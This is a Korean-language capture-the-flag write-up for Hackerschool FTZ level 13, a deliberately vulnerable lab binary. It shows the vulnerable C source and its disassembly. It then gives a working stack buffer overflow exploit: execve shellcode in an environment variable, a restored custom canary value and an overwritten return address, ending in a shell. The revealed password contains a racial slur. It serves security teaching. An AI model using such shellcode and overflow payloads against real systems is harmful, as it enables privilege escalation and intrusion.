# Hackerschool FTZ Level 13

```
login as: level13
level13@192.168.18.131's password:
Access denied
level13@192.168.18.131's password:
[level13@ftz level13]$ ls
attackme  hint  public_html  tmp
[level13@ftz level13]$ cat hint

#include <stdlib.h>

main(int argc, char *argv[])
{
   long i=0x1234567;
   char buf[1024];

   setreuid( 3094, 3094 );
   if(argc > 1)
   strcpy(buf,argv[1]);

   if(i != 0x1234567) {
   printf(" Warnning: Buffer Overflow !!! \n");
   kill(0,11);
   }
}

[level13@ftz level13]$ gdb ./attackme
GNU gdb Red Hat Linux (5.3post-0.20021129.18rh)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux-gnu"...
(gdb) disas main
Dump of assembler code for function main:
0x080484a0 <main+0>:    push   %ebp
0x080484a1 <main+1>:    mov    %esp,%ebp
0x080484a3 <main+3>:    sub    $0x418,%esp
0x080484a9 <main+9>:    movl   $0x1234567,0xfffffff4(%ebp)
0x080484b0 <main+16>:   sub    $0x8,%esp
0x080484b3 <main+19>:   push   $0xc16
0x080484b8 <main+24>:   push   $0xc16
0x080484bd <main+29>:   call   0x8048370 <setreuid>
0x080484c2 <main+34>:   add    $0x10,%esp
0x080484c5 <main+37>:   cmpl   $0x1,0x8(%ebp)
0x080484c9 <main+41>:   jle    0x80484e5 <main+69>
0x080484cb <main+43>:   sub    $0x8,%esp
0x080484ce <main+46>:   mov    0xc(%ebp),%eax
0x080484d1 <main+49>:   add    $0x4,%eax
0x080484d4 <main+52>:   pushl  (%eax)
0x080484d6 <main+54>:   lea    0xfffffbe8(%ebp),%eax
0x080484dc <main+60>:   push   %eax
0x080484dd <main+61>:   call   0x8048390 <strcpy>
0x080484e2 <main+66>:   add    $0x10,%esp
0x080484e5 <main+69>:   cmpl   $0x1234567,0xfffffff4(%ebp)
0x080484ec <main+76>:   je     0x804850d <main+109>
0x080484ee <main+78>:   sub    $0xc,%esp
0x080484f1 <main+81>:   push   $0x80485a0
0x080484f6 <main+86>:   call   0x8048360 <printf>
0x080484fb <main+91>:   add    $0x10,%esp
0x080484fe <main+94>:   sub    $0x8,%esp
0x08048501 <main+97>:   push   $0xb
0x08048503 <main+99>:   push   $0x0
0x08048505 <main+101>:  call   0x8048380 <kill>
0x0804850a <main+106>:  add    $0x10,%esp
0x0804850d <main+109>:  leave
0x0804850e <main+110>:  ret
0x0804850f <main+111>:  nop
End of assembler dump.
(gdb) quit
[level13@ftz level13]$ export EGG=`python -c 'print "\x90"*1024+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
[level13@ftz level13]$ /tmp/ge EGG
0xbffff8a2
[level13@ftz level13]$ ./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*8+"\xa2\xf8\xff\xbf"'`
Segmentation fault
[level13@ftz level13]$ ./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*4+"\xa2\xf8\xff\xbf"'`
[level13@ftz level13]$ ./attackme `python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\xa2\xf8\xff\xbf"'`
sh-2.05b$ my-pass
TERM environment variable not set.

Level14 Password is "what that nigga want?".

sh-2.05b$ quit
sh: quit: command not found
sh-2.05b$ exit
exit
```

이번에는 `i` 라는 변수를 통해서 커스텀 카나리를 만든다.

`i` 의 값이 0x1234567이 아니면 버퍼오버플로우라고 감지를 한다.

`i`의 위치를 계산해준 다음, 리틀엔디언에 맞춰서 `\x67\x45\x23\x01` 을 맞춰서 넣어주고,

이전 레벨들에서 했던 것처럼 환경변수에 쉘코드를 넣어놓고 주소를 구한다음 리턴어드레스 부분에 넣어주면 된다.

참고로 `long` 은 4바이트 이다.